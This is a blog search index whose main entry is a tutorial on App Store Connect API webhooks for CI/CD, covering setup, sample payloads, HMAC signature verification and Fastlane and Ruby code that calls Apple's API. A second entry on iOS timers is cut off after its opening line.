[ { "title": "App Store Connect API WebhookÔΩúAutomate CI/CD Workflows Seamlessly", "url": "/posts/zrealm-dev/app-store-connect-api-webhook-automate-ci-cd-workflows-seamlessly-7c0974856393/", "categories": "ZRealm Dev.", "tags": "ios-app-development, cicd, webhooks, fastlane, app-store, english, ai-translation", "date": "2025-12-27 17:02:01 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![CI/CD] Using App Store Connect API Webhook to Integrate Automated WorkflowsAp...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![CI/CD] Using App Store Connect API Webhook to Integrate Automated WorkflowsApp Store Connect Webhook Use Case Analysis and Practical Integration Tutorial.Photo by Volodymyr HryshchenkoPrefaceApple has been continuously expanding the App Store Connect API in recent years, which is great news for developers. In the past, even certificate management required a ‚Äúhardcore‚Äù web session (with expiration and SMS verification), making it difficult to integrate into CI/CD. Features like store reviews could only rely on unstable RSS feeds.In recent years, new features have been added almost every year, covering development, testing, and deployment processes, as well as later stages like reviews, finance, and data reports with native support. Additionally, user management, groups, and TestFlight capabilities have been enhanced, allowing App Store Connect API to better improve the Apple developer experience. Further reading: ‚ÄúApp Store Connect API now supports reading and managing Customer Reviews‚ÄùWWDC 2025 Automate your development process with the App Store Connect APIThe 2025 WWDC also brings the highly anticipated major feature ‚Äî Webhook Notifications: Build Upload Status (The status of a build upload changes.)Receive related data when the build upload status changes.Complete / Failed / Processing App Version Status (The status of an app version changes.)Receive relevant data when the app version status changes.Prepare for Submission / Ready for Review / Waiting for Review / Ready for Distribution / Rejected‚Ä¶ TestFlight Version Status (New TestFlight feedback is submitted by a tester.)Receive related data when a tester leaves feedback (crash report/screenshot feedback). Apple-hosted Asset Pack Status Changes (The status of an Apple-hosted asset pack version changes.)Receive related data when the status of an Apple-hosted asset pack version changes. App Store Connect API / Webhook notifications : Webhooks allow a system to send real-time data to another system over the web. Webhook allows a system to instantly send data to another system over the network. Unlike traditional APIs, where one system must make a request to receive data, a webhook allows you to push data to the receiving system immediately when an event occurs. Unlike traditional APIs, which require the receiver to actively send a request, Webhooks can instantly push data to the receiving system as soon as the event occurs. Webhooks are event-driven, meaning they are triggered by a specific action or event and immediately send the relevant data to a predefined URL, also called the ‚Äúwebhook URL‚Äù or ‚Äúcallback URL‚Äù. Webhook is event-driven, meaning it immediately sends relevant data to a pre-configured URL, known as the ‚ÄúWebhook URL‚Äù or ‚ÄúCallback URL,‚Äù when a specific action or event is triggered. A notification webhook is an endpoint you create on your server. Notification Webhook is an endpoint you set up on your own server. This webhook endpoint receives HTTP POST requests from App Store Connect. This Webhook endpoint receives HTTP POST requests from App Store Connect. The POST requests describe important events about your app. These POST requests describe important events related to your App. Use the webhooks notifications endpoint to configure notifications for events occurring in your apps. You can use Webhook notification endpoints to set up notifications for various events that occur with your App.5 Use Cases1. Trigger Submission After Build Processing CompletionBefore:In the past, when implementing App CI/CD packaging and submission, you had to wait for Apple to finish processing after uploading the build before continuing with the submission; Fastlane‚Äôs default approach was to poll App Store Connect to check the build status, and only proceed with the submission lane once it was marked Complete. Waiting time is about 20 minutes which is not a big deal for Self-hosted CI/CD, but if using cloud services, this 20-minute wait is a huge waste of resources. For example, GitHub Runner macOS costs US$ 0.062 per minute, so waiting for review submission alone causes an unnecessary cost of US$ 1.24 each time.Ref: Build Completed Processing ÈÄöÁü•‰ø° Êê≠ÈÖç Gmail Filter + Google Apps ScriptIn the era without Webhook for active notifications, we previously used ‚ÄúBuild Completed Processing notification email combined with Gmail Filter + Google Apps Script to trigger‚Äù to achieve the effect, but the process was a bit hardcore.After: With Webhook, the packaging and uploading step can finish as soon as the upload is complete. A Webhook notification is sent after the App Store Connect build process completes. We proceed with the submission process upon receiving the notification. Zero Waiting Cost 2. Align GitFlow Release Process with App Release TimingBefore: The final step in GitFlow deployment is merging the develop branch back into the master branch, which represents the current live version.Previously, tasks could only be executed manually or automatically on a fixed schedule. For example, the PM would release the app every Monday and merge develop into master on the same day. Manual execution is tedious, and with automatic execution, what if there‚Äôs a delay? Or if Monday happens to be a holiday? The app wouldn‚Äôt actually be released, but develop would have already been merged into master.In most cases, this is not very important. Only in extreme situations, such as needing to insert a hotfix during this time, could there be discrepancies. However, if you aim for a complete and stable CI/CD development process, this is a case worth exploring.Another approach, similar to above, is using the ‚ÄúApp is Ready for Sale notification email with Gmail Filter + Google Apps Script trigger,‚Äù which is also feasible.After: With Webhook, you can directly trigger CI/CD actions (Master to Develop) upon receiving app release notifications. Ensure the app is truly live before merging back to Master 3. App Release Messages After the app is released to users, there is another common internal workflow: sending release notifications to relevant teams, listing tasks included in the version, and completing related tasks.Before:Only manual, scheduled automatic, or using email triggered with Gmail Filter + Google Apps Script.After: With Webhook, you can connect to Jira/Asana API upon receiving an App release notification to batch complete tasks for the corresponding version and post release completion messages to Slack.4. Build Failed / Review Rejected Notifier Previously in sections 1 and 2, it was mentioned that workflows could be triggered by email notifications. However, in large teams with strict permission controls, iOS developers only have ‚Äúdeveloper‚Äù backend access and cannot release or manage apps, so they do not receive any app status change emails; this includes notifications for rejected uploaded builds or rejected submissions.Before:In the past, only a kind person (a.k.a PM) could forward emails to engineers. If that person missed it, the app rejection might only be discovered right before going live!After: This case is relatively simple: after receiving the Webhook notification, forward the message to Slack.5. Testflight Feedback Notifier Similar to 4, but using TestFlight Feedback Webhook notifications.Before:In the past, developers could only check tester feedback or crash issues by logging into the App Store Connect TestFlight backend themselves, which was very easy to overlook (there was even a case where feedback reported a year ago was only seen after a year).After: Forward Testflight Feedback Webhook notifications to Slack after receiving them. Other applications are welcome for creative ideas. Next, we will introduce how to connect and use it.App Store Connect API Webhook Setup Permission requirements: Admin or Account Holder privileges are required to configure.Setting Up App Store Connect API Webhook Notifications Go to App Store Connect Dashboard Navigate to ‚ÄúUsers and Access‚Äù -&gt; ‚ÄúIntegrations‚Äù Click ‚ÄúWebhooks‚Äù under ‚ÄúAdditional‚Äù Click the ‚ÄúCreate Webhook‚Äù button Name: Enter Webhook Name Payload URL: Enter the URL of your Webhook notification receiving service Secret String: Webhook Request verification key (you can generate a random string for use) App: Select the App to Receive Webhook Notifications Trigger Events: TestFlight FeedbackReceive related data when testers leave feedback.[] Crash Feedback[] Screenshot Feedback[] TestFlight Version StateReceive related data when the TestFlight version state changes. Learn more[] App Version StateReceive related data when the App version state changes. Learn more[] Build Upload StateReceive related data when the build upload state changes. Learn moreBackground AssetsReceive related data when specific changes occur in Apple-hosted asset pack versions. Learn more[] Update App Store Release Version[] Update External TestFlight Release Version[] Create Internal TestFlight Release Version[] Update Asset Pack VersionSelect according to your needs, or choose all notifications and decide whether to process them afterward.Finally, click ‚ÄúAdd‚Äù to create the Webhook.Testing App Store Connect API Webhook NotificationsGo to the Webhook page.Click the ‚ÄúTest‚Äù button at the top right to receive a test notification.The test notification content is as follows:Headers:{ \"content-type\": \"application/json\", \"x-apple-jingle-correlation-key\": \"PNSCHDQW3MY2AX6VSRFHYYNUL4\", \"x-apple-request-uuid\": \"7b64238e-16db-31a0-5fd5-944a7c61b45f\", \"x-apple-signature\": \"hmacsha256=cf50020f0bbd3c5274860594f616f1806965c1f9fb765d8d278f512dff5b4c0e\",}Body:{ \"data\" : { \"type\" : \"webhookPingCreated\", \"id\" : \"65726e27-cb79-47f2-a3e4-c8ced9f356e8\", \"version\" : 1, \"attributes\" : { \"timestamp\" : \"2025-12-26T15:47:38.472168681Z\" } }}App Store Connect API Webhook Notification Sending RecordsThe ‚ÄúRecent Deliveries‚Äù section at the bottom of the Webhook page shows the most recently sent Webhook events.Verify App Store Connect API Webhook NotificationsWhen creating a Webhook, we enter a ‚ÄúSecret‚Äù string. It is recommended to verify requests to prevent the Webhook URL from leaking, which could allow malicious actors to forge and send Webhook events to your service.Verification Method: Perform HMAC-SHA256 on the Request Body using your configured secret key and output a HEX string. Compare this string with the value following hmacsha256= in the x-apple-signature field of the Request Headers.Implementation ‚Äî Nodejs:import crypto from 'crypto';function verifyAppleWebhook(rawBody, appleSignature, secret) { const hex = crypto .createHmac('sha256', secret) .update(rawBody, 'utf8') .digest('hex'); return `hmacsha256=${hex}` === appleSignature;}Implementation ‚Äî Cloudflare Worker:function bufferToHex(buffer) { return [...new Uint8Array(buffer)] .map(b =&gt; b.toString(16).padStart(2, '0')) .join('');}async function hmacSha256Hex(secret, message) { const enc = new TextEncoder(); const key = await crypto.subtle.importKey( 'raw', enc.encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign'] ); const signature = await crypto.subtle.sign( 'HMAC', key, enc.encode(message) ); return bufferToHex(signature);}async function verifyAppleWebhook(request, secret) { const appleSignature = request.headers.get('X-Apple-Signature'); const rawBody = await request.clone().text(); const calculated = await hmacSha256Hex(secret, rawBody); return \"hmacsha256=\"+calculated === appleSignature;} Cloudflare Worker does not have the crypto module, so use the Web Crypto API (crypto.subtle) instead.Implementation ‚Äî Google Apps Script Web App ‚ùåDue to technical limitations, Google Apps Script Web App doGet(e)/doPost(e) cannot access Request Headers, so this method cannot be used to verify the request source.You can only add some key parameters in the URL query for simple validation and protection.App Store Connect API Webhook Notification PayloadHere are several event Payloads received during the App upload and review submission process, provided for your direct reference in automation development. Webhook only sends event and status names, without other detailed information such as version number or rejection reasons; we need to call the App Store Connect API ourselves using the Relationships Link in the Event Payload to get complete information.Build Version Upload ‚Äî Process Complete{ \"data\" : { \"type\" : \"buildUploadStateUpdated\", \"id\" : \"xxx-xx-xx-xx-xxx\", \"version\" : 1, \"attributes\" : { \"oldState\" : \"PROCESSING\", \"newState\" : \"COMPLETE\" }, \"relationships\" : { \"instance\" : { \"data\" : { \"type\" : \"buildUploads\", \"id\" : \"xxx-xx-xx-xx-xxx\" }, \"links\" : { \"self\" : \"https://api.appstoreconnect.apple.com/v1/buildUploads/xxx-xx-xx-xx-xxx\" } } } }}Build Version Upload ‚Äî Process Failed{ \"data\": { \"type\": \"buildUploadStateUpdated\", \"id\": \"xxx-xx-xx-xx-xxx\", \"version\": 1, \"attributes\": { \"oldState\": \"PROCESSING\", \"newState\": \"FAILED\" }, \"relationships\": { \"instance\": { \"data\": { \"type\": \"buildUploads\", \"id\": \"xxx-xx-xx-xx-xxx\" }, \"links\": { \"self\": \"https://api.appstoreconnect.apple.com/v1/buildUploads/xxx-xx-xx-xx-xxx\" } } } }}Mostly due to binary rejections, such as using the microphone without declaring it.App Version Status ‚Äî Prepare For Submission{ \"data\" : { \"type\" : \"appStoreVersionAppVersionStateUpdated\", \"id\" : \"xxx-xx-xx-xx-xxx\", \"version\" : 1, \"attributes\" : { \"newValue\" : \"PREPARE_FOR_SUBMISSION\", \"oldValue\" : \"DEVELOPER_REJECTED\", \"timestamp\" : \"2025-12-18T05:01:47.118Z\" }, \"relationships\" : { \"instance\" : { \"data\" : { \"type\" : \"appStoreVersions\", \"id\" : \"xxx-xx-xx-xx-xxx\" }, \"links\" : { \"self\" : \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xx-xx-xx-xxx\" } } } }}When a new version number is created and ready for submission, you can fill in the version information, update details, and select the Build to submit for review at this stage.App Version Status ‚Äî Ready For Review{ \"data\" : { \"type\" : \"appStoreVersionAppVersionStateUpdated\", \"id\" : \"xxx-xx-xx-xx-xxx\", \"version\" : 1, \"attributes\" : { \"newValue\" : \"READY_FOR_REVIEW\", \"oldValue\" : \"PREPARE_FOR_SUBMISSION\", \"timestamp\" : \"2025-12-18T03:41:12.516Z\" }, \"relationships\" : { \"instance\" : { \"data\" : { \"type\" : \"appStoreVersions\", \"id\" : \"xxx-xx-xx-xx-xxx\" }, \"links\" : { \"self\" : \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xx-xx-xx-xxx\" } } } }}Review data confirmed, ready to submit for review.App Version Status ‚Äî Waiting For Review (Submitted, Awaiting Review){ \"data\" : { \"type\" : \"appStoreVersionAppVersionStateUpdated\", \"id\" : \"xxx-xx-xx-xx-xxx\", \"version\" : 1, \"attributes\" : { \"newValue\" : \"WAITING_FOR_REVIEW\", \"oldValue\" : \"READY_FOR_REVIEW\", \"timestamp\" : \"2025-12-18T03:41:21.179Z\" }, \"relationships\" : { \"instance\" : { \"data\" : { \"type\" : \"appStoreVersions\", \"id\" : \"xxx-xx-xx-xx-xxx\" }, \"links\" : { \"self\" : \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xx-xx-xx-xxx\" } } } }}The app has been submitted for review and is awaiting approval.App Version Status ‚Äî Developer Rejected{ \"data\" : { \"type\" : \"appStoreVersionAppVersionStateUpdated\", \"id\" : \"xxx-xx-xx-xx-xxx\", \"version\" : 1, \"attributes\" : { \"newValue\" : \"DEVELOPER_REJECTED\", \"oldValue\" : \"WAITING_FOR_REVIEW\", \"timestamp\" : \"2025-12-18T03:50:30.552Z\" }, \"relationships\" : { \"instance\" : { \"data\" : { \"type\" : \"appStoreVersions\", \"id\" : \"xxx-xx-xx-xx-xxx\" }, \"links\" : { \"self\" : \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xx-xx-xx-xxx\" } } } }}Developer withdraws the version under review.App Version Status ‚Äî In Review (Official Review in Progress){ \"data\" : { \"type\" : \"appStoreVersionAppVersionStateUpdated\", \"id\" : \"xxx-xx-xx-xx-xxx\", \"version\" : 1, \"attributes\" : { \"newValue\" : \"IN_REVIEW\", \"oldValue\" : \"WAITING_FOR_REVIEW\", \"timestamp\" : \"2025-12-18T22:05:50.038Z\" }, \"relationships\" : { \"instance\" : { \"data\" : { \"type\" : \"appStoreVersions\", \"id\" : \"xxx-xx-xx-xx-xxx\" }, \"links\" : { \"self\" : \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xx-xx-xx-xxx\" } } } }}App Version Status ‚Äî Pending Developer Release (Approved and Waiting for Release){ \"data\" : { \"type\" : \"appStoreVersionAppVersionStateUpdated\", \"id\" : \"xxx-xx-xx-xx-xxx\", \"version\" : 1, \"attributes\" : { \"newValue\" : \"PENDING_DEVELOPER_RELEASE\", \"oldValue\" : \"IN_REVIEW\", \"timestamp\" : \"2025-12-18T22:34:18.785Z\" }, \"relationships\" : { \"instance\" : { \"data\" : { \"type\" : \"appStoreVersions\", \"id\" : \"xxx-xx-xx-xx-xxx\" }, \"links\" : { \"self\" : \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xx-xx-xx-xxx\" } } } }} The time of the Pending Developer Release event minus the time of the Waiting For Review event equals the waiting time between app submission and the release-ready status.App Version Status ‚Äî Ready for Distribution (App Ready for Release) a.k.a Ready For Sale{ \"data\" : { \"type\" : \"appStoreVersionAppVersionStateUpdated\", \"id\" : \"xxx-xx-xx-xx-xxx\", \"version\" : 1, \"attributes\" : { \"newValue\" : \"READY_FOR_DISTRIBUTION\", \"oldValue\" : \"PENDING_DEVELOPER_RELEASE\", \"timestamp\" : \"2025-12-23T06:03:50.925Z\" }, \"relationships\" : { \"instance\" : { \"data\" : { \"type\" : \"appStoreVersions\", \"id\" : \"xxx-xx-xx-xx-xxx\" }, \"links\" : { \"self\" : \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xx-xx-xx-xxx\" } } } }}App is ready for release (almost equivalent to Ready For Sale, but there is no Ready For Sale event). Your app has been accepted and is ready for distribution. To distribute your app, your agreements must be active. The Account Holder can accept the latest agreements in the Business section.App Store Connect API Webhook Workflow IntegrationMethod 1 ‚Äî Using Fastlane to Connect with App Store Connect APIThe fastest way here is to directly trigger the CI/CD service and use Fastlane‚Äôs built-in Spaceship to connect with the App Store Connect API. If you already use the Fastlane App Store Connect API to manage Match certificates or submissions, this method can be used directly without hassle; if not, first refer to the official documentation to generate an API Key and securely store it in your CI/CD service secrets. App Store Connect When the app status changes Trigger Webhook Webhook EndpointCan be a self-hosted service/API or a simple FAAS service (Cloudflare Worker / AWS Lambda / Cloud Functions / Google Apps Script) Verify Webhook (optional) Handle Webhook events and forward event requests to CI/CD services for executione.g. trigger GitHub Actions via GitHub API.. CI/CD ServiceGitHub Actions / Bitbucket Pipeline / Gitlab Runner‚Ä¶ Trigger Action Run Fastlane script, reuse Fastlane Spaceship authentication App Store Connect Call App Store Connect API to get complete information CI/CD Service Subsequent steps, such as sending notifications or triggering another action Fastlane Example: # Usage: # bundle exec fastlane appStoreConnectWebhookHandler \\ # data:'{\"data\":{\"type\":\"buildUploadStateUpdated\",\"id\":\"xxx-xxx-xxx-xx-xxx\",\"version\":1,\"attributes\":{\"oldState\":\"PROCESSING\",\"newState\":\"COMPLETE\"},\"relationships\":{\"instance\":{\"data\":{\"type\":\"buildUploads\",\"id\":\"xxx-xxx-xxx-xx-xxx\"},\"links\":{\"self\":\"https://api.appstoreconnect.apple.com/v1/buildUploads/xxx-xxx-xxx-xx-xxx\"}}}}}' # Notes: # - `data:` must be a JSON string. # - This lane is intended for local debugging (it prints the GET response). desc \"[Automation] Handle App Store Connect webhook payload and fetch related instance via ASC API\" lane :appStoreConnectWebhookHandler do \\\\|options\\\\| begin data = options[:data] UI.user_error!(\"Missing data\") if data.empty? data = JSON.parse(data) url = data.dig(\"data\", \"relationships\", \"instance\", \"links\", \"self\").to_s.strip UI.user_error!(\"Missing instance self url in JSON\") if url.empty? api_key = app_store_connect_api_key( key_id: \"xxxx\", issuer_id: \"xxxx-xxxx-xxxx-xxxx-165aa6465141\", key_filepath: \"./AuthKey_xxxx.p8\", duration: 1200, # optional (maximum 1200) in_house: false # optional but may be required if using match/sigh ) loadAppStoreConnectAPIKey # uri = URI.parse(url) http = Net::HTTP.new(uri.host, uri.port) http.use_ssl = true http.verify_mode = OpenSSL::SSL::VERIFY_PEER store = OpenSSL::X509::Store.new store.set_default_paths http.cert_store = store request = Net::HTTP::Get.new(uri.request_uri) token = Spaceship::ConnectAPI.token UI.user_error!(\"App Store Connect API token is not available. Make sure app_store_connect_api_key is configured correctly.\") if token.nil? request['Authorization'] = \"Bearer #{token.text}\" request['Content-Type'] = 'application/json' request['Accept'] = 'application/json' response = http.request(request) UI.message(\"üì° GET #{url} Response: [#{response.code}] #{response.message}\") UI.message(response.body) # response ## handle response...do next actions... rescue =&gt; e UI.error(\"‚ùå Failed handle App Store Connect API Webhook: #{e}\") end endMethod 2 ‚Äî Handle It Yourself at the Webhook EndpointThe second method is to handle everything directly on the Webhook Endpoint service, but the drawback is that you need to put the App Store Connect API Key on the service and handle Token verification yourself.Ruby Example:require 'jwt'require 'net/http'require 'time'keyFile = File.read('./AuthKey_XXXX.p8') # replace with your .p8 private key file (download from App Store Connect)privateKey = OpenSSL::PKey::EC.new(keyFile)payload = { iss: 'YOUR_ISSUE_ID', # replace with your issuer ID (found in App Store Connect User Access -&gt; Keys -&gt; App Store Connect API page) iat: Time.now.to_i, exp: Time.now.to_i + 60*20, aud: 'appstoreconnect-v1' }token = JWT.encode payload, privateKey, 'ES256', header_fields={kid:\"YOUR_KEY_ID\", typ:\"JWT\"} # replace with your key ID (found in App Store Connect User Access -&gt; Keys -&gt; App Store Connect API page)puts tokendecoded_token = JWT.decode token, privateKey, true, { algorithm: 'ES256' }puts decoded_token# Replace with the relationships link from the Webhook Payloaduri = URI(\"https://api.appstoreconnect.apple.com/v1/apps/APPID/customerReviews\") # replace APPID with your app ID in App Store Connect -&gt; Your App -&gt; App Information -&gt; Apple IDhttps = Net::HTTP.new(uri.host, uri.port)https.use_ssl = truerequest = Net::HTTP::Get.new(uri)request['Authorization'] = \"Bearer #{token}\";response = https.request(request)puts response.read_body For generating App Store Connect API Key, creating Tokens, and using the API, please refer to ‚ÄúApp Store Connect API now supports reading and managing Customer Reviews‚Äù.App Store Connect API ResponseHere are some example Responses obtained by calling the Relationships Link to get complete information after receiving a Webhook Event.Build Version Upload ‚Äî Process Completehttps://api.appstoreconnect.apple.com/v1/buildUploads/xxx-xx-xx-xx-xxx{ \"data\": { \"type\": \"buildUploads\", \"id\": \"xx-xx-xx-xxx-xx\", \"attributes\": { \"cfBundleShortVersionString\": \"1.101.0\", \"cfBundleVersion\": \"1\", \"createdDate\": \"2025-12-25T08:26:43-08:00\", \"state\": { \"errors\": [], \"warnings\": [], \"infos\": [], \"state\": \"COMPLETE\" }, \"platform\": \"IOS\", \"uploadedDate\": \"2025-12-25T08:28:35-08:00\" }, \"relationships\": { \"buildUploadFiles\": { \"links\": { \"self\": \"https://api.appstoreconnect.apple.com/v1/buildUploads/xx-xx-xx-xxx-xx/relationships/buildUploadFiles\", \"related\": \"https://api.appstoreconnect.apple.com/v1/buildUploads/xx-xx-xx-xxx-xx/buildUploadFiles\" } } }, \"links\": { \"self\": \"https://api.appstoreconnect.apple.com/v1/buildUploads/xx-xx-xx-xxx-xx\" } }, \"links\": { \"self\": \"https://api.appstoreconnect.apple.com/v1/buildUploads/xx-xx-xx-xxx-xx\" }}Build Version Upload ‚Äî Process Failedhttps://api.appstoreconnect.apple.com/v1/buildUploads/xxx-xx-xx-xx-xxx{ \"data\": { \"type\": \"buildUploads\", \"id\": \"xx-xx-xx-xx-xxx\", \"attributes\": { \"cfBundleShortVersionString\": \"1.101.0\", \"cfBundleVersion\": \"3\", \"createdDate\": \"2025-12-12T09:03:32-08:00\", \"state\": { \"errors\": [ { \"code\": \"90683\", \"description\": \"Missing purpose string in Info.plist. Your app‚Äôs code references one or more APIs that access sensitive user data, or the app has one or more entitlements that permit such access. The Info.plist file for the ‚ÄúMy.app‚Äù bundle should contain a NSMicrophoneUsageDescription key with a user-facing purpose string explaining clearly and completely why your app needs the data. If you‚Äôre using external libraries or SDKs, they may reference APIs that require a purpose string. While your app might not use these APIs, a purpose string is still required. For details, visit: https://developer.apple.com/documentation/uikit/protecting_the_user_s_privacy/requesting_access_to_protected_resources.\" } ], \"warnings\": [], \"infos\": [], \"state\": \"FAILED\" }, \"platform\": \"IOS\", \"uploadedDate\": \"2025-12-12T09:05:26-08:00\" }, \"relationships\": { \"buildUploadFiles\": { \"links\": { \"self\": \"https://api.appstoreconnect.apple.com/v1/buildUploads/xx-xx-xx-xx-xxx/relationships/buildUploadFiles\", \"related\": \"https://api.appstoreconnect.apple.com/v1/buildUploads/xx-xx-xx-xx-xxx/buildUploadFiles\" } } }, \"links\": { \"self\": \"https://api.appstoreconnect.apple.com/v1/buildUploads/xx-xx-xx-xx-xxx\" } }, \"links\": { \"self\": \"https://api.appstoreconnect.apple.com/v1/buildUploads/xx-xx-xx-xx-xxx\" }}Taking ITMS-90683 as an example.App Version Statushttps://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xx-xx-xx-xxx{ \"data\": { \"type\": \"appStoreVersions\", \"id\": \"xxx-xxx-xxx-xxx\", \"attributes\": { \"platform\": \"IOS\", \"versionString\": \"1.101.0\", \"appStoreState\": \"READY_FOR_SALE\", \"appVersionState\": \"READY_FOR_DISTRIBUTION\", \"copyright\": \"¬© 2025 ZhgChgLi.\", \"reviewType\": \"APP_STORE\", \"releaseType\": \"MANUAL\", \"earliestReleaseDate\": null, \"usesIdfa\": null, \"downloadable\": true, \"createdDate\": \"2025-12-15T19:12:55-08:00\" }, \"relationships\": { \"ageRatingDeclaration\": { \"links\": { \"self\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx/relationships/ageRatingDeclaration\", \"related\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx/ageRatingDeclaration\" } }, \"appStoreVersionLocalizations\": { \"links\": { \"self\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx/relationships/appStoreVersionLocalizations\", \"related\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx/appStoreVersionLocalizations\" } }, \"build\": { \"links\": { \"self\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx/relationships/build\", \"related\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx/build\" } }, \"appStoreVersionPhasedRelease\": { \"links\": { \"self\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx/relationships/appStoreVersionPhasedRelease\", \"related\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx/appStoreVersionPhasedRelease\" } }, \"gameCenterAppVersion\": { \"links\": { \"self\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx/relationships/gameCenterAppVersion\", \"related\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx/gameCenterAppVersion\" } }, \"routingAppCoverage\": { \"links\": { \"self\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx/relationships/routingAppCoverage\", \"related\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx/routingAppCoverage\" } }, \"appStoreReviewDetail\": { \"links\": { \"self\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx/relationships/appStoreReviewDetail\", \"related\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx/appStoreReviewDetail\" } }, \"appStoreVersionSubmission\": { \"links\": { \"self\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx/relationships/appStoreVersionSubmission\", \"related\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx/appStoreVersionSubmission\" } }, \"appClipDefaultExperience\": { \"links\": { \"self\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx/relationships/appClipDefaultExperience\", \"related\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx/appClipDefaultExperience\" } }, \"appStoreVersionExperiments\": { \"links\": { \"self\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx/relationships/appStoreVersionExperiments\", \"related\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx/appStoreVersionExperiments\" } }, \"appStoreVersionExperimentsV2\": { \"links\": { \"self\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx/relationships/appStoreVersionExperimentsV2\", \"related\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx/appStoreVersionExperimentsV2\" } }, \"customerReviews\": { \"links\": { \"self\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx/relationships/customerReviews\", \"related\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx/customerReviews\" } }, \"alternativeDistributionPackage\": { \"links\": { \"self\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx/relationships/alternativeDistributionPackage\", \"related\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx/alternativeDistributionPackage\" } } }, \"links\": { \"self\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx\" } }, \"links\": { \"self\": \"https://api.appstoreconnect.apple.com/v1/appStoreVersions/xxx-xxx-xxx-xxx\" }} As mentioned earlier, detailed app information, version number, and error reasons can only be obtained by calling the API.DoneAt this point, we can use the App Store Connect API Webhook to better improve App CI/CD and automation workflows, enhancing team development efficiency.Further Reading CI/CD Practical Guide (Part 1): What is CI/CD? How to Build a Stable and Efficient Development Team with CI/CD? Tool Selection? ZReviewTender ‚Äî Free Open Source App Reviews Monitoring Bot App Store Connect API Now Supports Reading and Managing Customer Reviews If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS Timer vs DispatchSourceTimerÔΩúSafe Usage with Finite State Machine & Design Patterns", "url": "/posts/zrealm-dev/ios-timer-vs-dispatchsourcetimer-safe-usage-with-finite-state-machine-design-patterns-62f68ebeecd3/", "categories": "ZRealm Dev.", "tags": "ios-app-development, design-patterns, timer, swift, finite-state-machine, english, ai-translation", "date": "2025-12-14 16:17:06 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![iOS] How to Choose and Safely Use Timer and DispatchSourceTimer?Encapsulating...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![iOS] How to Choose and Safely Use Timer and DispatchSourceTimer?Encapsulating 